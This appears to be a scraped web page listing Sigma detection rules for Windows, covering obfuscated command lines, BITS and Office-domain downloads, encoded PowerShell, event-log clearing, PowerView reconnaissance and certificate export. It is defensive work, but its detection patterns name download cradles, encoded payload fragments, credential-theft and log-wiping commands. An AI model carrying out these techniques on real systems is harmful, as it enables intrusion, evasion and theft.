<li><a href="#">title:Suspicious Dosfuscation Character in Commandline id: a77c1610-fc73-4019-8e29-0f51efc04a51 status: experimental description: Posssible Payload Obfuscation references: - author: frack113 date: 2022/02/15 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '^^' # - '""' - ',;,' - '%COMSPEC:~' # - '%%' # - '&&' - ' s^et ' - ' s^e^t ' - ' se^t ' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Suspicious Double Extension id: 1cdd9a09-06c9-4769-99ff-626e2b3991b8 status: stable description: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns author: Florian Roth (rule), @blu3_team (idea) references: - - date: 2019/06/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '.doc.exe' - '.docx.exe' - '.xls.exe' - '.xlsx.exe' - '.ppt.exe' - '.pptx.exe' - '.rtf.exe' - '.pdf.exe' - '.txt.exe' - ' .exe' - '______.exe' condition: selection falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Suspicious Download File Extension with BITS id: b85e5894-9b19-4d86-8c87-a2f3b81f0521 status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model]() references: - author: frack113 date: 2022/03/01 modified: 2022/06/12 logsource: product: windows service: bits-client detection: selection: EventID: 16403 LocalName|endswith: - '.ps1' - '.exe' - '.vbs' - '.bat' filter: # Typical updates: Chrome, Dropbox etc. LocalName|contains: '\AppData\' RemoteName|contains: '.com' condition: selection and not filter falsepositives: - Administrator PowerShell scripts level: medium tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Download from Office Domain id: 00d49ed5-4491-4271-a8db-650a4ef6f8c1 status: experimental description: Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents author: Florian Roth date: 2021/12/27 references: - - logsource: product: windows category: process_creation detection: selection_download: - Image|endswith: - '\curl.exe' - '\wget.exe' - CommandLine|contains: - 'Start-BitsTransfer' - '.DownloadFile(' - '.DownloadString(' selection_domains: CommandLine|contains: - '' - '' condition: selection_download and selection_domains falsepositives: - Scripts or tools that download attachments from these domains (OneNote, Outlook 365) level: high 
<li><a href="#">title:Suspicious Download with BITS from Suspicious TLD id: 6d44fb93-e7d2-475c-9d3d-54c9c1e33427 status: experimental description: Detects a suspicious download using the BITS client from a FQDN that is unusual. Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. references: - - author: Florian Roth date: 2022/06/10 modified: 2022/06/28 logsource: product: windows service: bits-client detection: selection: EventID: 16403 filter: RemoteName|contains: - '.com' - '.azureedge.net' - '.sfx.ms' - 'download.mozilla.org' # condition: selection and not filter falsepositives: - Other legitimate domains used by software updaters level: medium tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Download with BITS from Suspicious TLD id: d635249d-86b5-4dad-a8c7-d7272b788586 status: experimental description: Detects a suspicious download using the BITS client from a FQDN that is unusual. Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. references: - - author: Florian Roth date: 2022/06/28 logsource: product: windows service: bits-client detection: selection: EventID: 16403 RemoteName|contains: - 'raw.githubusercontent.com' - 'gist.githubusercontent.com' - 'pastebin.com' - 'cdn.discordapp.com/attachments/' - 'mediafire.com' - 'mega.nz' - 'ddns.net' - '.paste.ee' - '.hastebin.com' - '.ghostbin.co/' - 'ufile.io' - 'storage.googleapis.com' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Driver Install by pnputil.exe status: experimental id: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1 author: Hai Vaknin @LuxNoBulIshit, Avihay eldad @aloneliassaf, Austin Songer @austinsonger date: 2021/09/30 description: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin references: - - tags: - attack.persistence - attack.t1547 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '-i' - '/install' - '-a' - '/add-driver' - '.inf' Image|endswith: '\pnputil.exe' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Pnputil.exe being used may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. level: medium 
<li><a href="#">title:Suspicious Driver Load from Temp id: 2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75 status: test description: Detects a driver load from a temporary directory author: Florian Roth date: 2017/02/12 modified: 2021/11/27 logsource: category: driver_load product: windows detection: selection: ImageLoaded|contains: '\Temp\' condition: selection falsepositives: - There is a relevant set of false positives depending on applications in the environment level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 
<li><a href="#">title:Suspicious Driver Loaded By User id: f63508a0-c809-4435-b3be-ed819394d612 status: test description: Detects the loading of drivers via 'SeLoadDriverPrivilege' required to load or unload a device driver. With this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode. This user right does not apply to Plug and Play device drivers. If you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers. This will detect Ghost-In-The-Logs () and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff. author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - - date: 2019/04/08 modified: 2021/11/30 logsource: product: windows service: security detection: selection_1: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4673 PrivilegeList: 'SeLoadDriverPrivilege' Service: '-' filter: ProcessName|endswith: - '\Windows\System32\Dism.exe' - '\Windows\System32\rundll32.exe' - '\Windows\System32\fltMC.exe' - '\Windows\HelpPane.exe' - '\Windows\System32\mmc.exe' - '\Windows\System32\svchost.exe' - '\Windows\System32\wimserv.exe' - '\procexp64.exe' - '\procexp.exe' - '\procmon64.exe' - '\procmon.exe' - '\Google\Chrome\Application\chrome.exe' condition: selection_1 and not filter falsepositives: - 'Other legimate tools loading drivers. There are some: Sysinternals, CPU-Z, AVs etc. - but not much. You have to baseline this according to your used products and allowed tools. Also try to exclude users, which are allowed to load drivers.' level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Suspicious Dropbox API Usage id: 25eabf56-22f0-4915-a1ed-056b8dae0a68 status: experimental description: Detects an executable that isn't dropbox but communicates with the Dropbox API author: Florian Roth references: - - date: 2022/04/20 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' DestinationHostname|endswith: - 'api.dropboxapi.com' - 'content.dropboxapi.com' filter: Image|contains: '\Dropbox' condition: selection and not filter falsepositives: - Legitimate use of the API with a tool that the author wasn't aware of level: high 
<li><a href="#">title:Suspicious Dump64.exe Execution id: 129966c9-de17-4334-a123-8b58172e664d description: Detects when a user bypasses Defender by renaming a tool to dump64.exe and placing it in a Visual Studio folder status: experimental author: Austin Songer @austinsonger, Florian Roth date: 2021/11/26 references: - logsource: product: windows category: process_creation detection: selection: Image|endswith: '\dump64.exe' procdump_flags: CommandLine|contains: - ' -ma ' - 'accpeteula' filter: Image|contains: '\Installer\Feedback\dump64.exe' condition: ( selection and not filter ) or ( selection and procdump_flags ) tags: - attack.credential_access - attack.t1003.001 falsepositives: - Dump64.exe in other folders than the excluded one level: high 
<li><a href="#">title:Suspicious DumpMinitool Usage id: eb1c4225-1c23-4241-8dd4-051389fde4ce description: Detects suspicious ways to use of a Visual Studio bundled tool named DumpMinitool.exe status: experimental references: - - author: Florian Roth date: 2022/04/06 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\DumpMinitool.exe' - OriginalName: 'DumpMinitool.exe' filter_folder: Image|contains: - '\Microsoft Visual Studio\' - '\Extensions\' # susp_flags: CommandLine|contains: '.txt' cmd_has_flags: CommandLine|contains: ' Full' filter_cmd_misses_flags: CommandLine|contains: '--dumpType' condition: selection and ( ( not filter_folder ) or susp_flags or ( cmd_has_flags and not filter_cmd_misses_flags ) ) falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Encoded Obfuscated LOAD String id: 9c0295ce-d60d-40bd-bd74-84673b7592b1 status: test description: Detects suspicious base64 encoded and obbfuscated LOAD string often used for reflection.assembly load author: pH-T related: - id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59 type: similar date: 2022/03/01 modified: 2022/05/20 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # ::("L"+"oad") - 'OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ' - 'oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA' - '6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA' # ::("Lo"+"ad") - 'OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ' - 'oAOgAoACIATABvACIAKwAiAGEAZAAiACkA' - '6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA' # ::("Loa"+"d") - 'OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ' - 'oAOgAoACIATABvAGEAIgArACIAZAAiACkA' - '6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA' # ::('L'+'oad') - 'OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ' - 'oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA' - '6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA' # ::('Lo'+'ad') - 'OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ' - 'oAOgAoACcATABvACcAKwAnAGEAZAAnACkA' - '6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA' # ::('Loa'+'d') - 'OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ' - 'oAOgAoACcATABvAGEAJwArACcAZAAnACkA' - '6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA' condition: selection fields: - CommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Suspicious Encoded PowerShell Command Line id: ca2092a1-c273-4878-9b4b-0d60115bf5ea description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet) status: test references: - author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community date: 2018/09/03 modified: 2021/03/02 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' -e' # covers -en and -enc selection2: CommandLine|contains: ' JAB' selection3: CommandLine|contains|all: - ' -w' - ' hidden ' selection4: CommandLine|contains: - ' BA^J' - ' SUVYI' - ' SQBFAFgA' - ' aQBlAHgA' - ' aWV4I' - ' IAA' - ' IAB' - ' UwB' - ' cwB' selection5: CommandLine|contains: '.exe -ENCOD ' falsepositive1: CommandLine|contains|all: - ' -ExecutionPolicy' - 'remotesigned ' condition: ((selection and selection2) or (selection and selection2 and selection3) or (selection and selection4) or selection5) and not falsepositive1 level: high 
<li><a href="#">title:Suspicious Encoded Scripts in a WMI Consumer id: 83844185-1c5b-45bc-bcf3-b5bf3084ca5b status: experimental description: Detects suspicious encoded payloads in WMI Event Consumers author: Florian Roth references: - date: 2021/09/01 tags: - attack.execution - attack.t1047 - attack.persistence - attack.t1546.003 logsource: product: windows category: wmi_event detection: selection_destination: Destination|base64offset|contains: - 'WriteProcessMemory' - 'This program cannot be run in DOS mode' - 'This program must be run under Win32' condition: selection_destination fields: - User - Operation falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Enumerate Active Directory Computers with Get-AdComputer id: 36bed6b2-e9a0-4fff-beeb-413a92b86138 status: experimental author: frack113 date: 2022/03/17 description: utilize Get-AdComputer to enumerate Computers within Active Directory. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Get-AdComputer ' - '-Filter' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1018 
<li><a href="#">title:Suspicious Enumerate Active Directory Groups with Get-AdComputer id: 8c3a6607-b7dc-4f0d-a646-ef38c00b76ee status: experimental author: frack113 date: 2022/03/17 description: Detects the use of Get-AdGroup to enumerate Groups within Active Directory references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Get-AdGroup ' - '-Filter' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1069.002 
<li><a href="#">title:Suspicious Eventlog Clear or Configuration Using Wevtutil id: cc36992a-4671-4f21-a91d-6c2b72a2edf5 status: stable description: Detects clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others). author: Ecco, Daniil Yugoslavskiy, oscd.community references: - - date: 2019/09/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_wevtutil_binary: Image|endswith: '\wevtutil.exe' selection_wevtutil_command: CommandLine|contains: - 'clear-log' # clears specified log - ' cl ' # short version of 'clear-log' - 'set-log' # modifies config of specified log. could be uset to set it to a tiny size - ' sl ' # short version of 'set-log' selection_other_ps: Image|endswith: '\powershell.exe' CommandLine|contains: - 'Clear-EventLog' - 'Remove-EventLog' - 'Limit-EventLog' selection_other_wmic: Image|endswith: '\wmic.exe' CommandLine|contains: ' ClearEventLog ' condition: 1 of selection_other_* or (selection_wevtutil_binary and selection_wevtutil_command) falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1070.001 - car.2016-04-002 
<li><a href="#">title:Suspicious Execution from Outlook id: e212d415-0e93-435f-9e1a-f29005bb4723 status: test description: Detects EnableUnsafeClientMailRules used for Script Execution from Outlook author: Markus Neis references: - - date: 2018/12/27 modified: 2022/01/07 logsource: category: process_creation product: windows detection: clientMailRules: CommandLine|contains: 'EnableUnsafeClientMailRules' outlookExec: ParentImage|endswith: '\outlook.exe' CommandLine|contains|all: - '\\\\' - '\\' - '.exe' condition: clientMailRules or outlookExec falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059 - attack.t1202 
<li><a href="#">title:Suspicious Execution of Adidnsdump id: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160 status: experimental description: | This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed, Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP author: frack113 references: - date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \python.exe CommandLine|contains: adidnsdump condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1018 
<li><a href="#">title:Suspicious Execution of Hostname id: 7be5fb68-f9ef-476d-8b51-0256ebece19e status: experimental description: Use of hostname to get information author: frack113 references: - - date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \HOSTNAME.EXE condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 
<li><a href="#">title:Suspicious Execution of InstallUtil Without Log id: d042284c-a296-4988-9be5-f424fadcc28c status: experimental description: Uses the .NET InstallUtil.exe application in order to execute image without log author: frack113 references: - - date: 2022/01/23 modified: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \InstallUtil.exe Image|contains: Microsoft.NET\Framework CommandLine|contains|all: - '/logfile= ' - '/LogToConsole=false' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion 
<li><a href="#">title:Suspicious Execution of Powershell with Base64 id: fb843269-508c-4b76-8b8d-88679db22ce7 status: experimental description: Commandline to lauch powershell with a base64 payload author: frack113 references: - - - date: 2022/01/02 modified: 2022/02/10 logsource: category: process_creation product: windows detection: selection: Image|endswith: \powershell.exe CommandLine|contains: - ' -e ' - ' -en ' - ' -enc ' - ' -enco' - ' -ec ' filter: CommandLine|contains: ' -Encoding ' condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious Execution of SharpView Aka PowerView id: b2317cfa-4a47-4ead-b3ff-297438c0bc2d status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems author: frack113 references: - - - date: 2021/12/10 logsource: category: process_creation product: windows detection: sharpview: OriginalFileName: SharpView.exe sharpview_methods: Commandline|contains: - Get-DomainGPOUserLocalGroupMapping - Find-GPOLocation - Get-DomainGPOComputerLocalGroupMapping - Find-GPOComputerAdmin - Get-DomainObjectAcl - Get-ObjectAcl - Add-DomainObjectAcl - Add-ObjectAcl - Remove-DomainObjectAcl - Get-RegLoggedOn - Get-LoggedOnLocal - Get-NetRDPSession - Test-AdminAccess - Invoke-CheckLocalAdminAccess - Get-WMIProcess - Get-NetProcess - Get-WMIRegProxy - Get-Proxy - Get-WMIRegLastLoggedOn - Get-LastLoggedOn - Get-WMIRegCachedRDPConnection - Get-CachedRDPConnection - Get-WMIRegMountedDrive - Get-RegistryMountedDrive - Find-InterestingDomainAcl - Invoke-ACLScanner - Get-NetShare - Get-NetLoggedon - Get-NetLocalGroup - Get-NetLocalGroupMember - Get-NetSession - Get-PathAcl - ConvertFrom-UACValue - Get-PrincipalContext - New-DomainGroup - New-DomainUser - Add-DomainGroupMember - Set-DomainUserPassword - Invoke-Kerberoast - Export-PowerViewCSV - Find-LocalAdminAccess - Find-DomainLocalGroupMember - Find-DomainShare - Find-DomainUserEvent - Find-DomainProcess - Find-DomainUserLocation - Find-InterestingFile - Find-InterestingDomainShareFile - Find-DomainObjectPropertyOutlier - TestMethod - Get-Domain - Get-NetDomain - Get-DomainComputer - Get-NetComputer - Get-DomainController - Get-NetDomainController - Get-DomainFileServer - Get-NetFileServer - Convert-ADName - Get-DomainObject - Get-ADObject - Get-DomainUser - Get-NetUser - Get-DomainGroup - Get-NetGroup - Get-DomainDFSShare - Get-DFSshare - Get-DomainDNSRecord - Get-DNSRecord - Get-DomainDNSZone - Get-DNSZone - Get-DomainForeignGroupMember - Find-ForeignGroup - Get-DomainForeignUser - Find-ForeignUser - ConvertFrom-SID - Convert-SidToName - Get-DomainGroupMember - Get-NetGroupMember - Get-DomainManagedSecurityGroup - Find-ManagedSecurityGroups - Get-DomainOU - Get-NetOU - Get-DomainSID - Get-Forest - Get-NetForest - Get-ForestTrust - Get-NetForestTrust - Get-DomainTrust - Get-NetDomainTrust - Get-ForestDomain - Get-NetForestDomain - Get-DomainSite - Get-NetSite - Get-DomainSubnet - Get-NetSubnet - Get-DomainTrustMapping - Invoke-MapDomainTrust - Get-ForestGlobalCatalog - Get-NetForestCatalog - Get-DomainUserEvent - Get-UserEvent - Get-DomainGUIDMap - Get-GUIDMap - Resolve-IPAddress - Get-IPAddress - ConvertTo-SID - Invoke-UserImpersonation - Invoke-RevertToSelf - Get-DomainSPNTicket - Request-SPNTicket - Get-NetComputerSiteName - Get-SiteName - Get-DomainGPO - Get-NetGPO - Set-DomainObject - Set-ADObject - Add-RemoteConnection - Remove-RemoteConnection - Get-IniContent - Get-GptTmpl - Get-GroupsXML - Get-DomainPolicyData - Get-DomainPolicy - Get-DomainGPOLocalGroup - Get-NetGPOGroup condition: sharpview or sharpview_methods falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1049 - attack.t1069.002 - attack.t1482 - attack.t1135 - attack.t1033 
<li><a href="#">title:Suspicious Execution of Shutdown id: 34ebb878-1b15-4895-b352-ca2eeb99b274 status: experimental description: Use of the commandline to shutdown or reboot windows author: frack113 references: - - date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \shutdown.exe CommandLine|contains: - '/r ' - '/s ' condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1529 
<li><a href="#">title:Suspicious Execution of Systeminfo id: 0ef56343-059e-4cb6-adc1-4c3c967c5e46 status: experimental description: Use of systeminfo to get information author: frack113 references: - - date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \systeminfo.exe condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 
<li><a href="#">title:Suspicious Execution of Taskkill id: 86085955-ea48-42a2-9dd3-85d4c36b167d status: experimental description: Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server. author: frack113 references: - date: 2021/12/26 modified: 2022/05/17 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\taskkill.exe' - OriginalFileName: 'taskkill.exe' selection_cli: CommandLine|contains|all: - ' /f' - ' /im ' condition: all of selection* falsepositives: - Unknown level: low tags: - attack.impact - attack.t1489 
<li><a href="#">title:Suspicious Explorer Child Of Regsvr32 id: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca status: experimental description: Suspicious explorer.exe child of regsvr32.exe references: - - author: elhoim date: 2022/05/05 tags: - attack.defense_evasion - attack.t1218.010 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\regsvr32.exe' Image|endswith: '\explorer.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Export-PfxCertificate id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c status: experimental description: Detects Commandlet that is used to export certificates from the local certificate store and sometimes used by threat actors to steal private keys from compromised machines references: - - tags: - attack.credential_access - attack.t1552.004 author: Florian Roth date: 2021/04/23 modified: 2021/08/04 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: 'Export-PfxCertificate' condition: selection falsepositives: - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) level: high 
<li><a href="#">title:Suspicious Extexport Execution id: fb0b815b-f5f6-4f50-970f-ffe21f253f7a status: experimental description: Extexport.exe loads dll and is execute from other folder the original path references: - author: frack113 date: 2021/11/26 modified: 2022/05/16 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains: Extexport.exe - Image|endswith: '\Extexport.exe' - OriginalFileName: 'extexport.exe' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Suspicious Extrac32 Alternate Data Stream Execution id: 4b13db67-0c45-40f1-aba8-66a1a7198a1e status: experimental description: Extract data from cab file and hide it in an alternate data stream references: - tags: - attack.defense_evasion - attack.t1564.004 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - extrac32.exe - .cab CommandLine|re: ':[^\\\\]' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Extrac32 Execution id: aa8e035d-7be4-48d3-a944-102aec04400d status: experimental description: Download or Copy file with Extrac32 references: - tags: - attack.command_and_control - attack.t1105 author: frack113 date: 2021/11/26 modified: 2022/05/16 logsource: category: process_creation product: windows detection: selection_lolbas: - CommandLine|contains: extrac32.exe - Image|endswith: '\extrac32.exe' - OriginalFileName: 'extrac32.exe' selection_archive: ommandLine|contains: '.cab' selection_options: CommandLine|contains: - /C - /Y - ' \\' condition: all of selection_* falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious File Characteristics Due to Missing Fields id: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43 description: Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe status: experimental references: - - author: Markus Neis, Sander Wiebing date: 2018/11/22 modified: 2021/06/27 tags: - attack.execution - attack.t1059.006 logsource: product: windows category: process_creation detection: selection1: Description: '\?' FileVersion: '\?' selection2: Description: '\?' Product: '\?' selection3: Description: '\?' Company: '\?' folder: Image|contains: '\Downloads\' condition: (selection1 or selection2 or selection3) and folder fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious File Download via CertOC.exe id: 70ad0861-d1fe-491c-a45f-fa48148a300d description: Detects when a user downloads file by using CertOC.exe status: experimental author: Nasreddine Bencherchali date: 2022/05/16 references: - logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\certoc.exe' - OriginalFileName: 'CertOC.exe' selection_cli: CommandLine|contains: '-GetCACAPS' condition: all of selection* falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Suspicious Files in Default GPO Folder id: 5f87308a-0a5b-4623-ae15-d8fa1809bc60 status: experimental description: Detects the creation of copy of suspicious files (EXE/DLL) to the default GPO storage folder references: - author: elhoim date: 2022/04/28 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: '\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\' TargetFilename|endswith: - '.dll' - '.exe' condition: selection falsepositives: - Unknown tags: - attack.t1036.005 - attack.defense_evasion level: medium 
<li><a href="#">title:Suspicious Findstr 385201 Execution id: 37db85d1-b089-490a-a59a-c7b6f984f480 status: experimental description: Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed). author: frack113 references: - date: 2021/12/16 logsource: category: process_creation product: windows detection: selection: Image|endswith: \findstr.exe CommandLine|contains: ' 385201' condition: selection falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1518.001 
<li><a href="#">title:Suspicious ftp.exe id: 06b401f4-107c-4ff9-947f-9ec1e7649f1e status: test description: Detects renamed ftp.exe, ftp.exe script execution and child processes ran by ftp.exe author: Victor Sergeev, oscd.community references: - date: 2020/10/09 modified: 2022/05/13 logsource: category: process_creation product: windows detection: ftp_path: Image|endswith: 'ftp.exe' ftp_metadata: OriginalFileName: 'ftp.exe' cmd_with_script_modifier: CommandLine|contains: '-s:' parent_path: ParentImage|endswith: 'ftp.exe' condition: (ftp_path and cmd_with_script_modifier) or (ftp_metadata and cmd_with_script_modifier) or (ftp_metadata and not ftp_path) or parent_path fields: - CommandLine - ParentImage falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059 - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User id: 815bfc17-7fc6-4908-a55e-2f37b98cedb4 description: | Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. references: - status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_module detection: test_2: - Payload|contains: get-ADPrincipalGroupMembership - ContextInfo|contains: get-ADPrincipalGroupMembership test_7: - Payload|contains|all: - get-aduser - '-f ' - '-pr ' - DoesNotRequirePreAuth - ContextInfo|contains|all: - get-aduser - '-f ' - '-pr ' - DoesNotRequirePreAuth condition: 1 of test_* falsepositives: - Administrator script level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User id: 88f0884b-331d-403d-a3a1-b668cf035603 description: | Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. references: - status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: test_2: ScriptBlockText|contains: get-ADPrincipalGroupMembership test_7: ScriptBlockText|contains|all: - get-aduser - '-f ' - '-pr ' - DoesNotRequirePreAuth condition: 1 of test_* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get Information for SMB Share id: 6942bd25-5970-40ab-af49-944247103358 description: | Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. references: - status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_module detection: selection: - Payload|contains: get-smbshare - ContextInfo|contains: get-smbshare condition: selection falsepositives: - Administrator script level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get Information for SMB Share id: 95f0643a-ed40-467c-806b-aac9542ec5ab description: | Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. references: - status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: get-smbshare condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get Local Groups Information id: cef24b90-dddc-4ae1-a09a-8764872f69fc description: | Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. references: - status: experimental author: frack113 date: 2021/12/12 logsource: product: windows category: ps_module detection: test_3: - Payload|contains: - 'get-localgroup' - 'Get-LocalGroupMember' - ContextInfo|contains: - 'get-localgroup' - 'Get-LocalGroupMember' test_6: - Payload|contains|all: - 'Get-WMIObject' - 'Win32_Group' - ContextInfo|contains|all: - 'Get-WMIObject' - 'Win32_Group' condition: 1 of test_* falsepositives: - Administrator script level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get Local Groups Information id: fa6a5a45-3ee2-4529-aa14-ee5edc9e29cb status: experimental description: | Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. references: - author: frack113 date: 2021/12/12 logsource: product: windows category: ps_script detection: test_3: ScriptBlockText|contains: - 'get-localgroup' - 'Get-LocalGroupMember' test_6: ScriptBlockText|contains|all: - 'Get-WMIObject' - 'Win32_Group' condition: 1 of test_* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1069.001 
